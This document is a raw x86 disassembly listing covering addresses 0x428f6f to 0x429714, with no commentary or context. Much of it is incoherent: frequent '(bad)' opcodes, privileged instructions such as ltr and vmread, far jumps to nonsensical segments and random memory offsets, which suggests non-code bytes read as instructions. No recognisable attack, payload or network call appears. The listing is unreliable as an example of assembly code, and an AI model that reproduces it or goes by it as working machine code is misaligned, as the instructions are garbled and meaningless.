  428f6f:	(bad)  
  428f70:	js     0x428f71
  428f72:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428f78:	sub    eax,ebx
  428f7a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428f80:	add    eax,DWORD PTR [eax]
  428f82:	dec    ebp
  428f83:	push   eax
  428f84:	mov    al,BYTE PTR [ebp+0x1]
  428f87:	mov    eax,DWORD PTR [ebp-0x68]
  428f8a:	mov    eax,DWORD PTR [eax]
  428f8c:	sbb    bh,al
  428f8e:	or     ah,dh
  428f90:	dec    ebp
  428f91:	inc    DWORD PTR [eax+0x4]
  428f94:	push   ecx
  428f95:	add    BYTE PTR [edx-0x1],dh
  428f98:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  428f9e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428fa8:	add    ecx,DWORD PTR [ecx-0x1be77477]
  428fae:	push   ecx
  428faf:	cmp    BYTE PTR [ebx],al
  428fb1:	inc    ebp
  428fb2:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428fb8:	(bad)  
  428fb9:	(bad)  
  428fba:	in     al,0xff
  428fbc:	add    BYTE PTR [ebp+0x0],al
  428fbf:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428fc5:	add    al,bh
  428fc7:	(bad)  
  428fc8:	jmp    0x8d85:0x74b0558d
  428fcf:	dec    DWORD PTR [eax]
  428fd1:	call   DWORD PTR [ebp-0x7b]
  428fd4:	mov    edi,esi
  428fd6:	lock call DWORD PTR [ebp-0x75]
  428fda:	mov    esi,esp
  428fdc:	mov    ah,0xc6
  428fde:	mov    bh,0xc3
  428fe0:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428fe6:	add    DWORD PTR [eax],0x450050ff
  428fec:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428ff2:	inc    edi
  428ff4:	push   esp
  428ff6:	jmp    0xcd00:0x680481ff
  428ffd:	mov    DWORD PTR [ebx],esi
  428fff:	clc    
  429000:	cmp    edi,0xff9cff3b
  429006:	jne    0x429010
  429008:	mov    eax,eax
  42900a:	add    esi,DWORD PTR [eax]
  42900c:	int3   
  42900d:	inc    ebp
  42900e:	cmp    al,0x83
  429010:	add    BYTE PTR [eax],bl
  429012:	adc    DWORD PTR [ebx+0x768b5055],eax
  429018:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42901e:	mov    edi,eax
  429020:	cmp    BYTE PTR [ebp+0x45],cl
  429023:	jmp    0x428fb0
  429025:	mov    ebx,DWORD PTR [esp+ebp*8]
  429028:	inc    ebp
  429029:	or     al,0x2
  42902b:	dec    DWORD PTR [ebp+0x18]
  42902e:	jne    0x429085
  429030:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  429036:	mov    edi,DWORD PTR [ebx]
  429038:	in     al,0x50
  42903a:	xchg   ecx,eax
  42903b:	jmp    0x342df40
  429040:	adc    al,0x8b
  429042:	inc    ebp
  429043:	mov    al,ds:0x8b04008b
  429048:	push   ebp
  429049:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  42904f:	push   ebp
  429050:	test   DWORD PTR [ebx-0x2800d701],ecx
  429056:	inc    ebp
  429057:	dec    ebp
  429058:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  42905e:	mov    DWORD PTR [eax],0xe9ff00f4
  429064:	add    al,0x0
  429066:	add    BYTE PTR [eax],al
  429068:	mov    eax,edx
  42906a:	push   eax
  42906b:	rol    DWORD PTR [ebp-0xf0177],1
  429071:	bound  eax,QWORD PTR [ebp+0x50]
  429074:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  42907a:	add    BYTE PTR [ecx+0x558df0ff],cl
  429080:	mov    al,0xf
  429082:	test   DWORD PTR [edx],edx
  429084:	call   DWORD PTR [ebp-0x7a0001]
  42908a:	(bad)  
  42908b:	loop   0x42908c
  42908d:	jnp    0xc6988493
  429093:	mov    eax,ebx
  429095:	cmp    al,0x8b
  429097:	(bad)  
  429098:	cld    
  429099:	shr    esi,0xc
  42909c:	add    dl,al
  42909e:	push   eax
  42909f:	lea    eax,[ebp-0x1]
  4290a2:	mov    edx,esi
  4290a4:	cwde   
  4290a5:	cli    
  4290a6:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4290ac:	or     BYTE PTR [eax],cl
  4290ae:	inc    ebp
  4290af:	dec    ebp
  4290b0:	inc    DWORD PTR [ebx+0x74803914]
  4290b6:	add    DWORD PTR [ebx+0x451800],ecx
  4290bc:	call   DWORD PTR [eax+edx*1]
  4290bf:	add    ecx,DWORD PTR [ebp-0x34]
  4290c2:	push   edi
  4290c3:	adc    al,0x8
  4290c5:	mov    edx,DWORD PTR [ebp-0x14]
  4290c8:	mov    ecx,DWORD PTR [ebp+0x18]
  4290cb:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4290cf:	inc    DWORD PTR [eax+esi*8]
  4290d2:	inc    ebp
  4290d3:	stos   BYTE PTR es:[edi],al
  4290d4:	mov    edx,DWORD PTR [ebp-0x4]
  4290d7:	add    DWORD PTR [ebp-0x1c],eax
  4290da:	mov    edx,DWORD PTR [ebp-0x70]
  4290dd:	cmp    eax,DWORD PTR [eax]
  4290df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290e0:	mov    eax,DWORD PTR [eax]
  4290e2:	cld    
  4290e3:	jae    0x429065
  4290e5:	add    eax,DWORD PTR [ecx]
  4290e7:	clc    
  4290e8:	add    BYTE PTR [eax+0x30],dl
  4290eb:	mov    DWORD PTR [ecx],esi
  4290ed:	clc    
  4290ee:	pop    ds
  4290ef:	inc    ebp
  4290f0:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4290f6:	(bad)  
  4290f7:	push   DWORD PTR [edi]
  4290f9:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4290ff:	(bad)  
  429100:	jae    0x429101
  429102:	mov    eax,DWORD PTR [ebp-0x740175]
  429108:	sub    eax,DWORD PTR [eax]
  42910a:	add    eax,DWORD PTR [eax]
  42910c:	mov    DWORD PTR [ecx+0x5f],eax
  42910f:	mov    DWORD PTR [ebx-0x4],ebx
  429112:	ret    0xff
  429115:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42911b:	ret    
  42911c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  429122:	add    BYTE PTR [ebp-0x7d],al
  429125:	mov    DWORD PTR [eax],eax
  429127:	add    al,0x84
  429129:	inc    DWORD PTR [ecx]
  42912b:	lea    eax,[eax]
  42912d:	hlt    
  42912e:	sar    bh,cl
  429130:	test   BYTE PTR [eax+0x1],dl
  429133:	inc    ebp
  429134:	add    BYTE PTR [ebx],dh
  429136:	test   BYTE PTR [ebx],0x84
  429139:	push   eax
  42913a:	add    BYTE PTR [ebp+0x0],al
  42913d:	add    eax,0x86
  429142:	add    BYTE PTR [ebx-0x7f7b0340],cl
  429148:	add    BYTE PTR [ecx],al
  42914a:	add    BYTE PTR [eax],al
  42914c:	mov    esi,0x550030
  429151:	mov    ecx,DWORD PTR [edi]
  429153:	cld    
  429154:	fidiv  DWORD PTR [ebp+0x0]
  429157:	mov    edi,DWORD PTR [ecx]
  429159:	xor    BYTE PTR [eax+eax*1],0x84
  42915d:	add    eax,DWORD PTR [eax]
  42915f:	sbb    BYTE PTR [eax],al
  429161:	jne    0x429114
  429163:	mov    eax,DWORD PTR [ecx]
  429165:	sbb    BYTE PTR [eax],al
  429167:	mov    DWORD PTR [ebp-0x1],esp
  42916a:	add    BYTE PTR [eax+0x30e45ca],bh
  429170:	ret    0xb7fc
  429173:	dec    ebp
  429174:	or     al,0x89
  429176:	dec    ebp
  429177:	cld    
  429178:	cmovne ecx,DWORD PTR [eax-0x75]
  42917c:	add    edi,esp
  42917e:	seto   BYTE PTR [esi-0x72ffffff]
  429185:	inc    ebp
  429186:	adc    al,0x8b
  429188:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  42918f:	cmp    DWORD PTR [edi+0x72],edx
  429192:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  429198:	gs cmp al,0x0
  42919b:	je     0x429173
  42919d:	push   eax
  42919e:	sar    BYTE PTR [eax],1
  4291a0:	mov    bh,0x3e
  4291a2:	push   cs
  4291a3:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4291a9:	add    DWORD PTR [ecx+0x12],ebp
  4291ac:	dec    edx
  4291ad:	(bad)  
  4291ae:	mov    eax,edx
  4291b0:	in     al,dx
  4291b1:	adc    DWORD PTR [ecx],esi
  4291b3:	pop    esi
  4291b4:	inc    ecx
  4291b5:	leave  
  4291b6:	or     DWORD PTR [eax],ebx
  4291b8:	gs push ebp
  4291ba:	add    ah,ch
  4291bc:	into   
  4291bd:	in     al,dx
  4291be:	enter  0xb756,0xf0
  4291c2:	push   cs
  4291c3:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4291cd:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4291d3:	jnp    0x744316db
  4291d9:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4291df:	add    BYTE PTR [edi],cl
  4291e1:	mov    edi,DWORD PTR [ecx-0x78]
  4291e4:	ltr    WORD PTR [ecx-0x7b]
  4291e8:	dec    DWORD PTR [edi]
  4291ea:	clc    
  4291eb:	out    0x45,eax
  4291ed:	add    BYTE PTR [eax],cl
  4291ef:	cmp    ebx,0xffffff8c
  4291f2:	jge    0x4291f4
  4291f4:	jb     0x429206
  4291f6:	je     0x519276
  4291fc:	pop    edx
  4291fd:	push   esi
  4291fe:	mov    ecx,DWORD PTR [edi]
  429200:	in     al,dx
  429201:	rol    DWORD PTR [ebp+0x0],1
  429204:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42920b:	cmp    DWORD PTR [ecx],0xfffffff0
  42920e:	hlt    
  42920f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  429215:	(bad)  
  429217:	push   eax
  429218:	jns    0xb8427696
  42921e:	lock push cs
  429220:	ror    edx,0x3
  429223:	test   BYTE PTR [ecx+0x5500e800],cl
  429229:	dec    eax
  42922a:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42922e:	(bad)  
  42922f:	mov    esi,0x7f33ff5f
  429234:	inc    eax
  429235:	test   DWORD PTR [edx],eax
  429237:	je     0x4291f9
  429239:	mov    ecx,ecx
  42923b:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42923f:	and    eax,DWORD PTR [eax+0xf0103]
  429245:	jp     0x429233
  429247:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42924b:	add    edx,DWORD PTR [edi+0x74]
  42924e:	sbb    BYTE PTR [ebp+0x4d001484],cl
  429254:	add    BYTE PTR [ebp-0x74c48bbb],al
  42925a:	je     0x4291df
  42925c:	cmp    eax,edi
  42925e:	js     0x429283
  429260:	add    eax,0xeb0fc003
  429265:	jns    0x4291f2
  429267:	vmread DWORD PTR [ecx+0x45],ebx
  42926b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  429271:	adc    al,0x8b
  429273:	jge    0x429289
  429275:	mov    edi,DWORD PTR [eax-0x4]
  429278:	add    edi,DWORD PTR [edi]
  42927a:	or     bh,bh
  42927c:	push   ebp
  42927d:	push   es
  42927e:	mov    DWORD PTR [ebp-0x4],ebx
  429281:	add    edi,esi
  429283:	pop    es
  429284:	add    esi,DWORD PTR [edi-0x48ccf183]
  42928a:	mov    DWORD PTR [esp+esi*8],ecx
  42928d:	inc    ebp
  42928e:	pop    ebp
  42928f:	xor    DWORD PTR [esi-0x4],0x3b
  429293:	add    edx,DWORD PTR [ecx+edi*1]
  429296:	push   es
  429297:	clc    
  429298:	mov    bh,0xdb
  42929a:	jp     0x429253
  42929c:	add    cl,BYTE PTR [esi]
  42929e:	div    DWORD PTR [edi+0x4d8b0c1c]
  4292a4:	test   edi,edi
  4292a6:	je     0x42929c
  4292a8:	mov    eax,ecx
  4292aa:	or     BYTE PTR [ebx],al
  4292ac:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4292b2:	jbe    0x429326
  4292b4:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4292ba:	add    ecx,DWORD PTR [esi]
  4292bc:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4292c2:	add    eax,DWORD PTR [ebx-0x287af783]
  4292c8:	je     0x429317
  4292ca:	mov    DWORD PTR [ecx],edi
  4292cc:	mov    esi,eax
  4292ce:	hlt    
  4292cf:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4292d6:	jb     0x429298
  4292d8:	jmp    0x4292c5
  4292da:	xor    esi,DWORD PTR [ebx]
  4292dc:	pop    edi
  4292dd:	pop    esi
  4292de:	pop    ebx
  4292df:	ret    
  4292e0:	ret    0x8b
  4292e3:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4292e9:	cmp    DWORD PTR [eax],0xc
  4292ec:	pushf  
  4292ed:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4292f3:	(bad)  
  4292f5:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  4292fc:	dec    ebp
  4292fd:	ret    
  4292fe:	mov    edi,DWORD PTR [esi-0x4]
  429301:	pop    eax
  429302:	dec    ebp
  429303:	jne    0x429290
  429305:	xor    edi,esp
  429307:	inc    eax
  429308:	dec    ebp
  429309:	jbe    0x42935e
  42930b:	inc    eax
  42930c:	pop    ebp
  42930d:	add    edx,DWORD PTR [esi+0x8]
  429310:	push   eax
  429311:	dec    eax
  429312:	push   ecx
  429313:	mov    eax,edi
  429315:	and    al,0xf0
  429317:	jo     0x429304
  429319:	mov    eax,DWORD PTR [ebx]
  42931b:	sbb    BYTE PTR [ebp+0x4d],cl
  42931e:	mov    eax,DWORD PTR [ebx]
  429320:	nop
  429321:	or     BYTE PTR [eax],al
  429323:	jne    0x42937c
  429325:	cmp    ebx,DWORD PTR [eax+0x33893277]
  42932b:	cld    
  42932c:	xor    edi,edi
  42932e:	add    edi,DWORD PTR [ebp+0x3]
  429331:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  429337:	js     0x4292bd
  429339:	jae    0x42933d
  42933b:	(bad)  
  42933d:	xor    al,0x5d
  42933f:	jmp    0x4292cc
  429341:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  429348:	fdecstp 
  42934a:	test   BYTE PTR [edi],ah
  42934c:	add    bh,BYTE PTR [ebp+0x0]
  42934f:	add    ebx,DWORD PTR [ebp-0x77]
  429352:	mov    edi,eax
  429354:	cmp    al,0x0
  429357:	adc    dh,BYTE PTR [ebx]
  429359:	jge    0x42935e
  42935b:	mov    edi,DWORD PTR [ebx]
  42935d:	jl     0x42936e
  42935f:	clc    
  429360:	dec    edi
  429361:	jge    0x429363
  429363:	mov    eax,DWORD PTR [ebx]
  429365:	jb     0x42936f
  429367:	mov    ecx,DWORD PTR [ebp-0x8]
  42936a:	mov    edi,edi
  42936c:	xor    edx,DWORD PTR [eax]
  42936e:	add    edi,DWORD PTR [ebx]
  429370:	mov    DWORD PTR [ebp-0x10],edi
  429373:	inc    edi
  429374:	pop    ebp
  429375:	jge    0x4293b2
  429377:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42937b:	mov    edx,0xc05d87f0
  429380:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  429384:	fimul  WORD PTR [eax]
  429386:	fist   WORD PTR [ebp+0x1c]
  429389:	in     al,dx
  42938a:	jne    0x429378
  42938c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  429392:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  429396:	fdivp  st(0),st
  429398:	fild   WORD PTR [ebp+0x4510f85c]
  42939e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  4293a4:	inc    ebp
  4293a5:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  4293ab:	mov    ebp,DWORD PTR [ebx-0x4]
  4293ae:	adc    al,0x8b
  4293b0:	rcl    DWORD PTR [eax],0x48
  4293b3:	mov    esi,0x7080803
  4293b8:	fiadd  WORD PTR [ebp+0x4d]
  4293bb:	mov    cs,WORD PTR [ebx+0x558bfc52]
  4293c1:	cld    
  4293c2:	xor    ebx,DWORD PTR [ebx+0x330103]
  4293c8:	mov    DWORD PTR [edi+0x872dc],edi
  4293ce:	xlat   BYTE PTR ds:[ebx]
  4293cf:	into   
  4293d0:	ffreep st(6)
  4293d2:	retf   0x6c7
  4293d5:	iret   
  4293d6:	dec    ebp
  4293d7:	inc    ebp
  4293d8:	mov    DWORD PTR [ebx],edi
  4293da:	fmul   QWORD PTR [edi]
  4293dc:	dec    ebp
  4293dd:	jnp    0x429412
  4293df:	add    BYTE PTR [ebx],al
  4293e1:	mov    ecx,DWORD PTR [esp+edi*8]
  4293e4:	inc    ebp
  4293e5:	dec    ebp
  4293e6:	lea    esi,[ebx]
  4293e8:	add    DWORD PTR [ebx],eax
  4293ea:	jb     0x429427
  4293ec:	add    BYTE PTR [edi],cl
  4293ee:	inc    ebp
  4293ef:	imul   eax,edi,0x858bd800
  4293f5:	cld    
  4293f6:	clc    
  4293f7:	mov    DWORD PTR [ebp+0x0],eax
  4293fa:	inc    DWORD PTR [eax]
  4293fc:	or     al,0xde
  4293fe:	sbb    bh,0x1
  429401:	retf   
  429402:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  429409:	dec    ebp
  42940a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  429410:	enter  0x12de,0xdf
  429414:	inc    ebp
  429415:	pop    ebp
  429416:	dec    DWORD PTR [ebx-0x257f0ff4]
  42941c:	add    DWORD PTR [edx],edx
  42941e:	add    BYTE PTR [ebp+0x50],dl
  429421:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  429427:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  42942d:	or     ah,al
  42942f:	pop    ss
  429430:	cdq    
  429431:	push   ebp
  429432:	clc    
  429433:	mov    eax,DWORD PTR [ebp-0x4]
  429436:	xor    edx,edx
  429438:	add    esi,DWORD PTR [ebx]
  42943a:	cmp    eax,DWORD PTR [ebx]
  42943c:	hlt    
  42943d:	cmp    DWORD PTR [ebx],esp
  42943f:	or     al,BYTE PTR [ebp+0xf]
  429442:	mov    eax,DWORD PTR [edx]
  429444:	loopne 0x429446
  429446:	(bad)  
  429447:	mov    ecx,esi
  429449:	cld    
  42944a:	pushf  
  42944b:	pop    ebp
  42944c:	cwde   
  42944d:	mov    esi,DWORD PTR [edx]
  42944f:	lock mov eax,eax
  429452:	adc    BYTE PTR [ebx],al
  429454:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42945b:	xor    ebp,DWORD PTR [edi+0x50e45189]
  429461:	dec    ebp
  429462:	mov    ecx,DWORD PTR [ebx-0x31390304]
  429468:	(bad)  
  429469:	iret   
  42946a:	inc    ebp
  42946b:	(bad)  
  42946c:	jne    0x4294bb
  42946e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  429474:	(bad)  
  429475:	cmp    ebx,eax
  429477:	je     0x4293ff
  429479:	add    edi,edi
  42947b:	or     bh,bh
  42947d:	dec    ebp
  42947e:	inc    ebp
  42947f:	mov    esi,DWORD PTR [ebx]
  429481:	cld    
  429482:	add    ecx,esi
  429484:	cmp    ecx,DWORD PTR [eax-0xc]
  429487:	mov    edx,DWORD PTR [edi]
  429489:	or     BYTE PTR [ebp-0x7c],al
  42948c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  429492:	test   BYTE PTR [eax+ebx*4],cl
  429495:	inc    ebp
  429496:	xor    bh,BYTE PTR ds:0x8be89c89
  42949c:	out    dx,eax
  42949d:	adc    BYTE PTR [eax],al
  42949f:	jne    0x429468
  4294a1:	mov    ebp,esp
  4294a3:	fcomp  DWORD PTR [ebx]
  4294a5:	add    BYTE PTR [ecx],al
  4294a7:	inc    DWORD PTR [ebp-0x75]
  4294aa:	mov    ?,esp
  4294ac:	add    al,0xce
  4294ae:	mov    ecx,edi
  4294b0:	cld    
  4294b1:	inc    ebp
  4294b2:	fidivr WORD PTR [ebx]
  4294b4:	fbstp  TBYTE PTR [ebp-0x3e]
  4294b7:	mov    eax,DWORD PTR [eax]
  4294b9:	adc    BYTE PTR [ebx-0x3974038b],cl
  4294bf:	fadd   st,st(7)
  4294c1:	add    BYTE PTR [ebp-0x1],al
  4294c4:	mov    ecx,DWORD PTR [esp+edi*8]
  4294c7:	inc    ebp
  4294c8:	mov    bh,0xc7
  4294cb:	loopne 0x429512
  4294cd:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  4294d3:	add    DWORD PTR [ebx],esi
  4294d5:	pushf  
  4294d6:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  4294dc:	mov    eax,edi
  4294de:	cwde   
  4294df:	inc    ebp
  4294e0:	inc    ebp
  4294e1:	jne    0x42946e
  4294e3:	mov    esp,esp
  4294e5:	clc    
  4294e6:	add    al,0x4d
  4294e8:	mov    DWORD PTR [ebx],esi
  4294ea:	or     al,0x33
  4294ec:	inc    ebp
  4294ed:	lea    ecx,[ebx-0x398d13fd]
  4294f3:	add    bh,al
  4294f5:	inc    ebp
  4294f6:	ror    DWORD PTR [ebx+0x45d829],0x8b
  4294fd:	add    ebp,esp
  4294ff:	shufps xmm1,xmm3,0xc7
  429503:	(bad)  
  429504:	jmp    0x7487d02d
  429509:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42950f:	hlt    
  429510:	mov    ecx,DWORD PTR [edi]
  429512:	fadd   DWORD PTR [ebp+0x0]
  429515:	xor    ecx,DWORD PTR [edi]
  429517:	add    ecx,ecx
  429519:	cmp    edi,edi
  42951b:	pmuludq mm7,QWORD PTR [edx+0x50]
  42951f:	(bad)  
  429520:	jmp    0x4294ad
  429522:	mov    edi,esp
  429524:	or     al,0xc6
  429526:	inc    ebp
  429527:	(bad)  
  429528:	mov    eax,DWORD PTR [ebp+0x10]
  42952b:	jne    0x4294b6
  42952d:	mov    eax,DWORD PTR [ecx]
  42952f:	clc    
  429530:	add    BYTE PTR [ebp-0x40],cl
  429533:	xor    edx,DWORD PTR [eax-0x73]
  429536:	jne    0x429539
  429538:	push   DWORD PTR [edx+0x8]
  42953b:	add    BYTE PTR [ebp+0x45],al
  42953e:	mov    ebp,ecx
  429540:	cld    
  429541:	add    BYTE PTR [ebp+0x0],cl
  429544:	xor    eax,DWORD PTR [ebp+0x3]
  429547:	mov    al,0x3b
  429549:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42954f:	sub    eax,0x5d330e4d
  429554:	lea    esi,[ebx]
  429556:	add    DWORD PTR [ebx],eax
  429558:	jb     0x429543
  42955a:	add    BYTE PTR [eax],al
  42955c:	inc    ebp
  42955d:	add    bl,ch
  42955f:	inc    ebp
  429560:	mov    esi,DWORD PTR [ebx]
  429562:	or     al,0x3
  429564:	(bad)  
  429565:	mov    edi,eax
  429567:	in     al,dx
  429568:	scas   eax,DWORD PTR es:[edi]
  429569:	inc    ebp
  42956a:	mov    esi,DWORD PTR [ebx]
  42956c:	in     al,0x3
  42956e:	add    al,0x89
  429570:	mov    ecx,DWORD PTR [eax+edi*8]
  429573:	dec    ebp
  429574:	(bad)  
  429575:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  42957c:	mov    ecx,eax
  42957e:	cld    
  42957f:	push   es
  429580:	dec    ebp
  429581:	add    al,0x33
  429583:	mov    DWORD PTR [ebx],eax
  429585:	in     al,dx
  429586:	cmp    DWORD PTR [ebp-0x67],eax
  429589:	mov    eax,DWORD PTR [ebp-0xba0068]
  42958f:	mov    edx,DWORD PTR [ebp-0x4]
  429592:	mov    ecx,DWORD PTR [ebp-0x18]
  429595:	xor    ecx,DWORD PTR [ebp+0x3]
  429598:	cmp    DWORD PTR [ebx],0x8b327497
  42959e:	xor    edi,esp
  4295a0:	jmp    0xff7692f2
  4295a5:	add    ecx,DWORD PTR [ebp-0x3f]
  4295a8:	xor    ebx,DWORD PTR [edi]
  4295aa:	add    eax,ecx
  4295ac:	cmp    ebx,DWORD PTR [eax]
  4295ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4295b1:	mov    ecx,DWORD PTR [eax]
  4295b3:	adc    BYTE PTR [ebp-0x80],al
  4295b6:	jmp    0x4295b9
  4295b8:	mov    eax,DWORD PTR [eax]
  4295ba:	cld    
  4295bb:	mov    bh,0xc6
  4295bd:	push   ecx
  4295be:	(bad)  
  4295bf:	jne    0x42961f
  4295c1:	dec    ecx
  4295c3:	or     BYTE PTR [ecx+ebx*1],cl
  4295c6:	push   ebp
  4295c7:	inc    ebp
  4295c8:	in     al,dx
  4295c9:	add    ebp,esp
  4295cb:	or     bh,al
  4295cd:	dec    ebp
  4295ce:	cld    
  4295cf:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  4295d5:	cmp    DWORD PTR [ecx],0x2
  4295d8:	pushf  
  4295d9:	dec    DWORD PTR [ebx+0x45510cf4]
  4295df:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  4295e5:	mov    edx,DWORD PTR [ecx+0xc]
  4295e8:	xor    eax,esi
  4295ea:	mov    edx,0xc172c7
  4295ef:	inc    ebp
  4295f0:	mov    esi,DWORD PTR [ebp+0x8]
  4295f3:	mov    eax,edx
  4295f5:	call   0x84c75cea
  4295fa:	add    DWORD PTR [eax-0x76bace00],ebx
  429600:	mov    ebp,eax
  429602:	or     BYTE PTR [eax],dl
  429604:	jo     0x429653
  429606:	push   edi
  429607:	xor    esi,DWORD PTR [ebp+0x3]
  42960a:	(bad)  
  42960b:	pmulhuw mm0,mm1
  42960e:	test   DWORD PTR [ebp-0x8],ecx
  429611:	mov    DWORD PTR [ebp-0x67],eax
  429614:	mov    eax,DWORD PTR [ebp-0x4]
  429617:	xor    edi,DWORD PTR [ebp-0x73]
  42961a:	xor    eax,DWORD PTR [ebx]
  42961c:	xor    esi,DWORD PTR [edx+0x3]
  42961f:	add    BYTE PTR [ecx],bh
  429621:	inc    ebp
  429622:	(bad)  
  429623:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  429629:	mov    DWORD PTR [eax],0x750f0004
  42962f:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  429635:	lock add BYTE PTR [ebp+0x0],al
  429639:	mov    esi,DWORD PTR [ebp-0x2c]
  42963c:	mov    ebp,edx
  42963e:	or     al,0x72
  429640:	ja     0x429642
  429642:	mov    edx,esi
  429644:	cld    
  429645:	(bad)  
  429648:	cli    
  429649:	mov    esi,DWORD PTR [ebp-0x4]
  42964c:	cmp    ecx,esi
  42964e:	bswap  edi
  429650:	(bad)
  429654:	mov    esi,DWORD PTR [ebp-0x4]
  429657:	mov    esi,ecx
  429659:	clc    
  42965a:	repnz add esi,DWORD PTR [ebp+0x45]
  42965e:	push   ebx
  42965f:	xor    eax,DWORD PTR [ebp+0x3]
  429662:	cmp    ebx,DWORD PTR [edi-0x64]
  429665:	pop    ebx
  429666:	jmp    0x42972d
  42966b:	mov    esi,DWORD PTR [ebp-0x7d]
  42966e:	xor    ebp,DWORD PTR [eax]
  429670:	lea    eax,[ebp-0x8]
  429673:	cmp    dl,dh
  429675:	pushf  
  429676:	out    dx,eax
  429677:	(bad)  
  429678:	neg    eax
  42967a:	ins    DWORD PTR es:[edi],dx
  42967b:	test   esi,edi
  42967d:	clc    
  42967e:	pop    esp
  42967f:	inc    ebp
  429680:	or     BYTE PTR [ecx+0x450f0c7d],cl
  429686:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  42968c:	add    cl,al
  42968e:	jne    0x429628
  429690:	mov    esi,DWORD PTR [edx]
  429692:	in     al,dx
  429693:	push   esi
  429694:	xor    BYTE PTR [ebp-0xe],dh
  429697:	add    edi,esi
  429699:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  42969f:	add    cl,bh
  4296a1:	mov    edi,DWORD PTR [ebp+0x8]
  4296a4:	mov    DWORD PTR [ebp-0x14],esi
  4296a7:	add    esi,DWORD PTR [ebp+0x3c]
  4296aa:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  4296b0:	mov    ah,0x3d
  4296b2:	cwde   
  4296b3:	pushf  
  4296b4:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  4296ba:	jne    0x429647
  4296bc:	mov    ecx,DWORD PTR [esp+ebp*8]
  4296bf:	icebp  
  4296c0:	icebp  
  4296c1:	shl    edx,0xf2
  4296c4:	(bad)  
  4296c5:	mov    ah,0x16
  4296c7:	cmp    BYTE PTR [ebp-0x6d],dh
  4296ca:	mov    ecx,DWORD PTR [edi]
  4296cc:	in     al,dx
  4296cd:	jmp    0x4296c0
  4296cf:	add    dl,dh
  4296d1:	mov    edi,esi
  4296d3:	or     al,0x8
  4296d5:	inc    ebp
  4296d6:	jne    0x4296db
  4296d8:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  4296de:	ret    
  4296df:	or     bh,bh
  4296e1:	jge    0x4296cb
  4296e3:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  4296e9:	xor    edi,eax
  4296eb:	add    esi,DWORD PTR [ebp-0x77]
  4296ee:	mov    ebx,esp
  4296f0:	clc    
  4296f1:	neg    DWORD PTR [ebp-0x7c]
  4296f4:	xor    eax,DWORD PTR [eax]
  4296f6:	cmp    eax,DWORD PTR [eax]
  4296f8:	repz jne 0x429690
  4296fb:	xor    eax,DWORD PTR [ecx]
  4296fd:	add    ebx,DWORD PTR [eax]
  4296ff:	mov    DWORD PTR [ebp-0x8],eax
  429702:	mov    eax,edi
  429704:	cld    
  429705:	lock pop eax
  429707:	test   DWORD PTR [ebx],esi
  429709:	clc    
  42970a:	add    edx,DWORD PTR [edi-0x740bff77]
  429710:	fdivp  st(4),st
  429712:	test   ecx,esi
  429714:	(bad)  
